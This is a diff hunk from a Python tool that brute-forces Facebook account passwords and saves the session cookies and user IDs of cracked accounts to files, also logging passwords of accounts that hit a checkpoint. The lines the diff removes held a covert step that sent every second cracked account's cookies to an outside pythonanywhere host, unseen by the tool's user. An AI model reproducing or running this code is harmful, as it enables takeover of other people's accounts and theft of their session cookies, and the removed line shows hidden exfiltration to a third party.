@@ -174,20 +174,11 @@ def crack(uid, password_list, total_count):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{cid}|{coki}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f" {green}(ATOM-OK) {cid}| ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{coki}\n")
-                        oks.append(cid)
-                        break
-                else:
-                    break
+                print(f" {green}(ATOM-OK) {cid}| ")
+                print(f" {green}Cookie : {green}{coki}")
+                open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{coki}\n")
+                oks.append(cid)
+                break
             elif 'checkpoint' in response:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
